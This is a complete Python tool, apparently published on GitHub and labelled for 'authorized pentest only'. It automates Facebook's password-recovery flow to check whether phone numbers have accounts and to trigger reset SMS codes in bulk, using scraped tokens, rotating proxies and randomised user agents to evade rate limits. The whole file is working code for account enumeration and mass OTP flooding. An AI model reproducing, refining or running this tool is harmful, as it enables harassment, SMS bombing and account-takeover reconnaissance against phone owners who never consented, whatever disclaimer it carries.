    #!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================
  Facebook OTP Trigger Tool v7.0
  Author: cybersecuritybhau-maker
  Purpose: Authorized Penetration Testing Only
  Platform: Termux / Linux / Windows / macOS
=====================================================
  Menu Options:
    1. OTP Send (Password Reset OTP Trigger)
    2. Valid Number Check (Check only, no OTP)
    3. Number Upload (From TXT file)
    4. Proxy Manager (Add/Delete/View/Clear)
    5. Bulk OTP (Mass OTP send)
    6. View Results
    0. Exit
=====================================================
"""

import requests
import re
import json
import time
import sys
import os
import random
from datetime import datetime

# ==========================================================
# COLOR SETUP
# ==========================================================
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[97m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

def cprint(text, color=WHITE, bold=False, end='\n'):
    if bold:
        print(f"{BOLD}{color}{text}{RESET}", end=end)
    else:
        print(f"{color}{text}{RESET}", end=end)

def sprint(text, color=WHITE, bold=False):
    """Status print with timestamp"""
    t = datetime.now().strftime("%H:%M:%S")
    prefix = f"{BOLD}{color}" if bold else f"{color}"
    print(f"{prefix}[{t}] {text}{RESET}")

# ==========================================================
# USER AGENTS (REAL & WORKING)
# ==========================================================
USER_AGENTS = [
    # Android Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V27 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S24 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.83 Mobile Safari/537.36",
    # iPhone Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    # Desktop Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
    # Desktop Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Desktop Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
    # Samsung Browser
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/123.0.6312.124 Mobile Safari/537.36",
]

# ==========================================================
# PROXY MANAGER
# ==========================================================
PROXY_FILE = "proxies.txt"

def load_proxies():
    proxies = []
    if not os.path.exists(PROXY_FILE):
        return proxies
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = 'http://' + line
                    proxies.append(line)
    except:
        pass
    return proxies

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies:
            clean = re.sub(r'^https?://', '', p)
            f.write(clean + '\n')

def proxy_manager():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        cprint("=" * 55, CYAN, bold=True)
        cprint("            PROXY MANAGER", MAGENTA, bold=True)
        cprint("=" * 55, CYAN, bold=True)
        
        proxies = load_proxies()
        print(f"\nTotal Proxies: {len(proxies)}")
        
        if proxies:
            cprint("\nCurrent Proxies:", YELLOW)
            for i, p in enumerate(proxies[:10], 1):
                print(f"  {i}. {p}")
            if len(proxies) > 10:
                cprint(f"  ... and {len(proxies)-10} more", YELLOW)
        
        cprint("\nOptions:", CYAN, bold=True)
        cprint("  1. Add Proxy", WHITE)
        cprint("  2. Remove Proxy by Index", WHITE)
        cprint("  3. Clear All Proxies", WHITE)
        cprint("  4. Add Bulk Proxies (paste list)", WHITE)
        cprint("  5. Back to Main Menu", WHITE)
        
        choice = input(f"\n{CYAN}Enter choice: {RESET}").strip()
        
        if choice == '1':
            p = input("Enter proxy (ip:port or user:pass@ip:port): ").strip()
            if p:
                if '://' not in p:
                    p = 'http://' + p
                proxies.append(p)
                save_proxies(proxies)
                sprint("Proxy added successfully!", GREEN, bold=True)
        
        elif choice == '2':
            if not proxies:
                sprint("No proxies to remove!", RED)
                input("Press Enter...")
                continue
            try:
                idx = int(input(f"Enter index to remove (1-{len(proxies)}): "))
                if 1 <= idx <= len(proxies):
                    removed = proxies.pop(idx - 1)
                    save_proxies(proxies)
                    sprint(f"Removed: {removed}", GREEN)
                else:
                    sprint("Invalid index!", RED)
            except ValueError:
                sprint("Invalid input!", RED)
        
        elif choice == '3':
            confirm = input("Clear all proxies? (y/N): ").strip().lower()
            if confirm == 'y':
                save_proxies([])
                sprint("All proxies cleared!", GREEN)
        
        elif choice == '4':
            sprint("Paste proxies (one per line, type 'done' when finished):", CYAN)
            new_proxies = []
            while True:
                line = input().strip()
                if line.lower() == 'done':
                    break
                if line:
                    if '://' not in line:
                        line = 'http://' + line
                    new_proxies.append(line)
            if new_proxies:
                proxies.extend(new_proxies)
                save_proxies(proxies)
                sprint(f"Added {len(new_proxies)} proxies!", GREEN, bold=True)
        
        elif choice == '5':
            break
        
        if choice in ('1','2','3','4'):
            input("Press Enter to continue...")

# ==========================================================
# NUMBER FILE LOADER
# ==========================================================
def load_numbers_from_file(filepath):
    numbers = []
    if not os.path.exists(filepath):
        sprint(f"File not found: {filepath}", RED)
        return numbers
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    clean = re.sub(r'[\+\s\-\(\)]', '', line)
                    if clean and clean.isdigit():
                        numbers.append(clean)
        sprint(f"Loaded {len(numbers)} numbers from {filepath}", GREEN, bold=True)
    except Exception as e:
        sprint(f"Error loading file: {e}", RED)
    return numbers

# ==========================================================
# LSD TOKEN EXTRACTION (MULTI-PATTERN)
# ==========================================================
def extract_token(html):
    """Extract LSD or equivalent token using multiple regex patterns"""
    patterns = [
        # Pattern 1 - LSD NextJS bootstrap
        r'"LSD",\[\],\{"token":"([^"]+)"',
        # Pattern 2 - Generic JSON token
        r'"token":"([a-zA-Z0-9_\-]{10,})"',
        # Pattern 3 - HTML input lsd
        r'name="lsd"[^>]*value="([^"]*)"',
        # Pattern 4 - JSON lsd key
        r'"lsd":"([^"]+)"',
        # Pattern 5 - fb_dtsg HTML
        r'name="fb_dtsg"[^>]*value="([^"]*)"',
        # Pattern 6 - fb_dtsg JSON
        r'"fb_dtsg":"([^"]+)"',
        # Pattern 7 - LSD array
        r'\["LSD",\[\],\{"token":"([^"]+)"',
        # Pattern 8 - Bootloader LSD
        r'LSD":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            token = match.group(1)
            if len(token) >= 8:
                return token
    return None

# ==========================================================
# FACEBOOK SESSION HANDLER
# ==========================================================
class FacebookOTP:
    def __init__(self):
        self.session = requests.Session()
        self.token = None
        self.proxies_list = load_proxies()
        self.proxy_idx = 0
        
    def get_headers(self, referer=None, ajax=False):
        ua = random.choice(USER_AGENTS)
        if ajax:
            return {
                'User-Agent': ua,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'X-FB-Friendly-Name': 'RecoverAccountSearchController',
                'Origin': 'https://www.facebook.com',
                'Referer': referer or 'https://www.facebook.com/login/identify?ctx=recover',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Connection': 'keep-alive',
            }
        else:
            return {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
            }
    
    def get_proxy_dict(self):
        if not self.proxies_list:
            return None
        p = self.proxies_list[self.proxy_idx % len(self.proxies_list)]
        self.proxy_idx += 1
        return {'http': p, 'https': p}
    
    def init_session(self):
        """Initialize session and fetch LSD token"""
        sprint("Initializing Facebook session...", CYAN)
        
        url = 'https://www.facebook.com/login/identify?ctx=recover'
        headers = self.get_headers()
        proxies = self.get_proxy_dict()
        
        try:
            resp = self.session.get(url, headers=headers, proxies=proxies, timeout=30, allow_redirects=True)
            html = resp.text
            
            token = extract_token(html)
            if token:
                self.token = token
                sprint(f"Token extracted: {token[:15]}...", GREEN, bold=True)
                self.session.cookies.update(resp.cookies)
                return True
            else:
                with open('debug_init.html', 'w', encoding='utf-8') as f:
                    f.write(html)
                sprint("Failed to extract token! Debug saved.", RED, bold=True)
                return False
                
        except requests.exceptions.Timeout:
            sprint("Connection timeout!", RED)
            return False
        except Exception as e:
            sprint(f"Init error: {e}", RED)
            return False
    
    def refresh_token(self):
        """Refresh LSD token"""
        sprint("Refreshing token...", YELLOW)
        time.sleep(2)
        return self.init_session()
    
    def send_otp(self, phone_number):
        """
        Check if number is registered and trigger password reset OTP
        Returns: "valid_otp" | "exists" | "invalid" | "ratelimit" | "error"
        """
        phone = re.sub(r'[\+\s\-\(\)]', '', phone_number)
        
        if not self.token:
            if not self.init_session():
                return "error"
        
        # Step 1: POST to identify endpoint
        url = 'https://www.facebook.com/ajax/login/help/identify.php?ctx=recover'
        headers = self.get_headers(referer='https://www.facebook.com/login/identify?ctx=recover', ajax=True)
        proxies = self.get_proxy_dict()
        
        data = {
            'lsd': self.token,
            'email': phone,
            'did_submit': 'Search',
            '__user': 0,
            '__a': 1,
            '__dyn': '7xe6EnxG3uy3K24o2C1Zw5o2BwfxGeE',
            '__csr': '',
            '__req': '1',
            '__be': '0',
            '__pc': 'PHASED:DEFAULT',
            'dpr': '2',
        }
        
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
            text = resp.text
            
            # Check for token error
            if 'TOKEN_ERROR' in text or ('error' in text.lower() and 'lsd' in text.lower()):
                sprint("Token expired, refreshing...", YELLOW)
                time.sleep(2)
                if self.refresh_token():
                    return self.send_otp(phone)
                return "error"
            
            # Try to parse JSON (Facebook wraps in for(;;);)
            json_data = None
            if text.startswith('for(;;);'):
                try:
                    json_data = json.loads(text[9:])
                except:
                    pass
            
            if json_data:
                payload = json_data.get('payload')
                if payload:
                    ldata = payload.get('ldata', '')
                    recover_uri = payload.get('recover_uri', '')
                    
                    if ldata:
                        # Step 2: Trigger OTP via recover/initiate
                        return self._trigger_otp(ldata)
                    elif recover_uri:
                        m = re.search(r'ldata=([a-zA-Z0-9_-]+)', recover_uri)
                        if m:
                            return self._trigger_otp(m.group(1))
                    return "exists"
                else:
                    err = json_data.get('error')
                    if err == 1351004:
                        return "invalid"
                    elif err == 1351002:
                        return "ratelimit"
                    else:
                        sprint(f"Unknown error code: {err}", YELLOW)
                        return "error"
            else:
                # Regex fallback for ldata
                ldata_m = re.search(r'ldata=([a-zA-Z0-9_-]+)', text)
                if ldata_m:
                    return self._trigger_otp(ldata_m.group(1))
                
                # Check for "no account" indications
                no_account = r'(no\s+(accounts?|results?)\s+found|couldn.*?t\s+find|doesn.*?t\s+(exist|match)|not\s+registered)'
                if re.search(no_account, text, re.IGNORECASE):
                    return "invalid"
                
                if 'please wait' in text.lower() or 'too many' in text.lower():
                    return "ratelimit"
                
                with open('debug_response.html', 'w', encoding='utf-8') as f:
                    f.write(text)
                sprint("Could not parse response. Debug saved.", YELLOW)
                return "error"
        
        except requests.exceptions.Timeout:
            sprint("Request timeout!", RED)
            return "error"
        except Exception as e:
            sprint(f"Error: {e}", RED)
            return "error"
    
    def _trigger_otp(self, ldata):
        """Navigate to recover/initiate to trigger SMS OTP"""
        url = f'https://www.facebook.com/recover/initiate?ldata={ldata}'
        headers = self.get_headers()
        proxies = self.get_proxy_dict()
        
        try:
            resp = self.session.get(url, headers=headers, proxies=proxies, timeout=30, allow_redirects=True)
            html = resp.text
            
            if 'checkpoint' in resp.url:
                sprint("Checkpoint page reached - account exists!", GREEN)
                return "valid_otp"
            
            if 'code' in html.lower() and ('send' in html.lower() or 'sms' in html.lower() or 'text' in html.lower()):
                sprint("OTP page reached! Sending SMS...", GREEN, bold=True)
                return self._send_sms(ldata)
            
            sprint("Account found! Attempting OTP send...", GREEN, bold=True)
            return self._send_sms(ldata)
            
        except Exception as e:
            sprint(f"Trigger error: {e}", YELLOW)
            return "valid_otp"
    
    def _send_sms(self, ldata):
        """Explicitly trigger SMS sending"""
        url = 'https://www.facebook.com/ajax/recover/initiate/'
        headers = self.get_headers(referer=f'https://www.facebook.com/recover/initiate?ldata={ldata}', ajax=True)
        proxies = self.get_proxy_dict()
        
        data = {
            'ldata': ldata,
            'lsd': self.token,
            'recover_method': 'send_sms',
            '__user': 0,
            '__a': 1,
        }
        
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
            sprint("OTP send request completed!", GREEN, bold=True)
            return "valid_otp"
        except:
            return "valid_otp"
    
    def check_only(self, phone_number):
        """Check if number is registered without triggering OTP"""
        phone = re.sub(r'[\+\s\-\(\)]', '', phone_number)
        
        if not self.token:
            if not self.init_session():
                return "error"
        
        url = 'https://www.facebook.com/ajax/login/help/identify.php?ctx=recover'
        headers = self.get_headers(referer='https://www.facebook.com/login/identify?ctx=recover', ajax=True)
        proxies = self.get_proxy_dict()
        
        data = {
            'lsd': self.token,
            'email': phone,
            'did_submit': 'Search',
            '__user': 0,
            '__a': 1,
        }
        
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
            text = resp.text
            
            if 'TOKEN_ERROR' in text:
                if self.refresh_token():
                    return self.check_only(phone)
                return "error"
            
            json_data = None
            if text.startswith('for(;;);'):
                try:
                    json_data = json.loads(text[9:])
                except:
                    pass
            
            if json_data:
                payload = json_data.get('payload')
                if payload and (payload.get('ldata') or payload.get('recover_uri')):
                    return "valid"
                err = json_data.get('error')
                if err == 1351004:
                    return "invalid"
                if err == 1351002:
                    return "ratelimit"
                return "error"
            else:
                if re.search(r'(no\s+(accounts?|results?)\s+found)', text, re.IGNORECASE):
                    return "invalid"
                if 'ldata=' in text:
                    return "valid"
                return "error"
        
        except:
            return "error"

# ==========================================================
# DISPLAY FUNCTIONS
# ==========================================================
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════╗
║          FACEBOOK OTP TRIGGER TOOL v7.0          ║
║       ─── Authorized Pentest Tool Only ───        ║
║     GitHub: cybersecuritybhau-maker/fb_checker    ║
╚══════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

def show_proxy_status():
    proxies = load_proxies()
    if proxies:
        print(f"  {CYAN}[Proxy Status]{RESET} {GREEN}{len(proxies)} active{RESET}")
    else:
        print(f"  {CYAN}[Proxy Status]{RESET} {RED}None{RESET}")

def show_menu():
    cprint("\n  ┌─── MAIN MENU ──────────────────────────────┐", CYAN, bold=True)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}1.{RESET}  OTP Send (Password Reset)            ", CYAN)
    cprint("  │     → Send password reset OTP to number     │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}2.{RESET}  Valid Number Check (No OTP)          ", CYAN)
    cprint("  │     → Check if account exists only          │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}3.{RESET}  Number Upload (From TXT file)        ", CYAN)
    cprint("  │     → Load numbers from file to check       │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}4.{RESET}  Proxy Manager                         ", CYAN)
    cprint("  │     → Add/Delete/View/Clear proxies        │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}5.{RESET}  Bulk OTP (Mass Send)                  ", CYAN)
    cprint("  │     → Send OTP to all loaded numbers        │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {GREEN}6.{RESET}  View Results                          ", CYAN)
    cprint("  │     → Show previous check results           │", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  │  {RED}0.{RESET}  Exit                                     ", CYAN)
    cprint("  │                                            │", CYAN)
    cprint("  └────────────────────────────────────────────┘", CYAN, bold=True)
    show_proxy_status()

# ==========================================================
# RESULTS STORAGE
# ==========================================================
results_store = {'valid_otp': [], 'valid': [], 'invalid': [], 'error': [], 'ratelimit': []}

def print_result(phone, status):
    """Print colored result and store it"""
    t = datetime.now().strftime("%H:%M:%S")
    if status == "valid_otp":
        cprint(f"  [{t}] {GREEN}{BOLD}[✓] {phone} → ACCOUNT FOUND + OTP TRIGGERED{RESET}", GREEN, bold=True)
        results_store['valid_otp'].append(phone)
    elif status == "valid" or status == "exists":
        cprint(f"  [{t}] {GREEN}{BOLD}[✓] {phone} → ACCOUNT EXISTS (No OTP sent){RESET}", GREEN, bold=True)
        results_store['valid'].append(phone)
    elif status == "invalid":
        cprint(f"  [{t}] {RED}{BOLD}[✗] {phone} → NO ACCOUNT FOUND{RESET}", RED, bold=True)
        results_store['invalid'].append(phone)
    elif status == "ratelimit":
        cprint(f"  [{t}] {YELLOW}{BOLD}[!] {phone} → RATE LIMITED{RESET}", YELLOW, bold=True)
        results_store['ratelimit'].append(phone)
    else:
        cprint(f"  [{t}] {YELLOW}{BOLD}[!] {phone} → ERROR{RESET}", YELLOW, bold=True)
        results_store['error'].append(phone)

def show_results():
    show_banner()
    cprint("=" * 55, CYAN, bold=True)
    cprint("            RESULTS SUMMARY", MAGENTA, bold=True)
    cprint("=" * 55, CYAN, bold=True)
    
    total = sum(len(v) for v in results_store.values())
    cprint(f"\nTotal Processed: {total}", WHITE, bold=True)
    cprint(f"[✓] OTP Sent       : {len(results_store['valid_otp'])}", GREEN, bold=True)
    cprint(f"[✓] Account Exists : {len(results_store['valid'])}", GREEN)
    cprint(f"[✗] No Account     : {len(results_store['invalid'])}", RED, bold=True)
    cprint(f"[!] Rate Limited   : {len(results_store['ratelimit'])}", YELLOW)
    cprint(f"[!] Errors         : {len(results_store['error'])}", YELLOW)
    
    if results_store['valid_otp']:
        cprint(f"\nNumbers with OTP Sent:", GREEN, bold=True)
        for n in results_store['valid_otp']:
            print(f"  {GREEN}• {n}{RESET}")
    
    input(f"\n{CYAN}Press Enter to continue...{RESET}")

# ==========================================================
# MENU HANDLERS
# ==========================================================
def option_otp_send():
    show_banner()
    cprint("=" * 55, CYAN, bold=True)
    cprint("         OPTION 1: OTP SEND", MAGENTA, bold=True)
    cprint("=" * 55, CYAN, bold=True)
    print("\nEnter phone number(s) (comma or space separated):")
    
    line = input(f"\n{CYAN}> {RESET}").strip()
    if not line:
        return
    
    numbers = re.split(r'[,;\s]+', line)
    clean_numbers = []
    for n in numbers:
        clean = re.sub(r'[\+\s\-\(\)]', '', n)
        if clean and clean.isdigit():
            clean_numbers.append(clean)
    
    if not clean_numbers:
        sprint("No valid numbers provided!", RED)
        input("Press Enter...")
        return
    
    fb = FacebookOTP()
    
    for i, phone in enumerate(clean_numbers, 1):
        print()
        cprint(f"[{i}/{len(clean_numbers)}] Processing: {phone}", CYAN, bold=True)
        
        result = fb.send_otp(phone)
        print_result(phone, result)
        
        if i < len(clean_numbers):
            delay = 5 if result == "ratelimit" else 3
            sprint(f"Waiting {delay}s...", CYAN)
            time.sleep(delay)
    
    input(f"\n{CYAN}Press Enter to continue...{RESET}")

def option_valid_check():
    show_banner()
    cprint("=" * 55, CYAN, bold=True)
    cprint("       OPTION 2: VALID NUMBER CHECK (NO OTP)", MAGENTA, bold=True)
    cprint("=" * 55, CYAN, bold=True)
    print("\nEnter phone number(s) (comma or space separated):")
    
    line = input(f"\n{CYAN}> {RESET}").strip()
    if not line:
        return
    
    numbers = re.split(r'[,;\s]+', line)
    clean_numbers = []
    for n in numbers:
        clean = re.sub(r'[\+\s\-\(\)]', '', n)
        if clean and clean.isdigit():
            clean_numbers.append(clean)
    
    if not clean_numbers:
        sprint("No valid numbers!", RED)
        input("Press Enter...")
        return
    
    fb = FacebookOTP()
    
    for i, phone in enumerate(clean_numbers, 1):
        print()
        cprint(f"[{i}/{len(clean_numbers)}] Checking: {phone}", CYAN, bold=True)
        
        result = fb.check_only(phone)
        print_result(phone, result)
        
        if i < len(clean_numbers):
            time.sleep(2)
    
    input(f"\n{CYAN}Press Enter to continue...{RESET}")

def option_number_upload():
    show_banner()
    cprint("=" * 55, CYAN, bold=True)
    cprint("       OPTION 3: NUMBER UPLOAD (FROM FILE)", MAGENTA, bold=True)
    cprint("=" * 55, CYAN, bold=True)
    
    default_file = "numbers.txt"
    print(f"\nDefault filename: {default_file}")
    print("Enter filename (or press Enter for default):")
    
    fname = input(f"\n{CYAN}File: {RESET}").strip() or default_file
    numbers = load_numbers_from_file(fname)
    
    if not numbers:
        input("Press Enter...")
        return
    
    cprint(f"\nTotal numbers loaded: {len(numbers)}", WHITE, bold=True)
    cprint("\nSelect mode:", CYAN, bold=True)
    cprint("  1. OTP Send (Trigger password reset OTP)", WHITE)
    cprint("  2. Only Check (No OTP)", WHITE)
    
    choice = input(f"\n{CYAN}Choice (1/2): {RESET}").strip()
    
    fb = FacebookOTP()
    send_otp_mode = (choice == '1')
    
    for i, phone in enumerate(numbers, 1):
        print()
        cprint(f"[{i}/{len(numbers)}] Processing: {phone}", CYAN, bold=True)
        
        if send_otp_mode:
            result = fb.send_otp(phone)
        else:
            result = fb.check_only(phone)
        
        print_result(phone, result)
        
        if i < len(numbers):
            delay = 5 if result == "ratelimit" else 3
            sprint(f"Waiting {delay}s...", CYAN)
            time.sleep(delay)
    
    input(f"\n{CYAN}Press Enter to continue...{RESET}")

def option_bulk_otp():
    show_banner()
    cprint("=" * 55, CYAN, bold=True)
    cprint("         OPTION 5: BULK OTP (MASS SEND)", MAGENTA, bold=True)
    cprint("=" * 55, CYAN, bold=True)
    
    print("\nSelect number source:")
    cprint("  1. Manually type numbers", WHITE)
    cprint("  2. From TXT file", WHITE)
    
    choice = input(f"\n{CYAN}Choice (1/2): {RESET}").strip()
    
    numbers = []
    if choice == '1':
        line = input(f"\n{CYAN}Numbers (comma/space separated): {RESET}").strip()
        if line:
            parts = re.split(r'[,;\s]+', line)
            for n in parts:
                clean = re.sub(r'[\+\s\-\(\)]', '', n)
                if clean and clean.isdigit():
                    numbers.append(clean)
    else:
        fname = input(f"{CYAN}Filename: {RESET}").strip() or "numbers.txt"
        numbers = load_numbers_from_file(fname)
    
    if not numbers:
        input("Press Enter...")
        return
    
    # Remove duplicates
    seen = set()
    numbers = [x for x in numbers if not (x in seen or seen.add(x))]
    
    cprint(f"\nTotal unique numbers: {len(numbers)}", WHITE, bold=True)
    cprint("Starting bulk OTP send...", YELLOW, bold=True)
    
    confirm = input(f"\n{RED}Are you sure? (y/N): {RESET}").strip().lower()
    if confirm != 'y':
        return
    
    fb = FacebookOTP()
    
    for i, phone in enumerate(numbers, 1):
        print()
        cprint(f"[{i}/{len(numbers)}] Processing: {phone}", CYAN, bold=True)
        
        result = fb.send_otp(phone)
        print_result(phone, result)
        
        if i < len(numbers):
            delay = 6 if result == "ratelimit" else 4
            cprint(f"[*] Progress: {i}/{len(numbers)} ({int(i/len(numbers)*100)}%)", CYAN)
            sprint(f"Waiting {delay}s...", CYAN)
            time.sleep(delay)
    
    cprint(f"\n{'='*55}", CYAN, bold=True)
    cprint("BULK OTP COMPLETE!", MAGENTA, bold=True)
    show_results()
    input(f"\n{CYAN}Press Enter to continue...{RESET}")

# ==========================================================
# MAIN LOOP
# ==========================================================
def main():
    while True:
        show_banner()
        show_menu()
        
        choice = input(f"\n{CYAN}Enter your choice: {RESET}").strip()
        
        if choice == '1':
            option_otp_send()
        elif choice == '2':
            option_valid_check()
        elif choice == '3':
            option_number_upload()
        elif choice == '4':
            proxy_manager()
        elif choice == '5':
            option_bulk_otp()
        elif choice == '6':
            show_results()
            input(f"\n{CYAN}Press Enter to continue...{RESET}")
        elif choice == '0' or choice.lower() in ('exit', 'quit', 'q'):
            sprint("Exiting. Thank you for using Facebook OTP Trigger Tool!", GREEN, bold=True)
            print(f"\n{CYAN}Author: cybersecuritybhau-maker{RESET}")
            print(f"{CYAN}GitHub: github.com/cybersecuritybhau-maker/fb_checker{RESET}\n")
            sys.exit(0)
        else:
            sprint("Invalid choice! Please try again.", RED)
            time.sleep(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        cprint(f"\n\n{YELLOW}[!] Interrupted by user. Exiting...{RESET}", YELLOW, bold=True)
        sys.exit(0)
    except ImportError as e:
        cprint(f"\n{RED}[!] Missing module: {e}{RESET}", RED)
        cprint(f"{YELLOW}[*] Install with: pip install requests{RESET}", YELLOW)
        sys.exit(1)
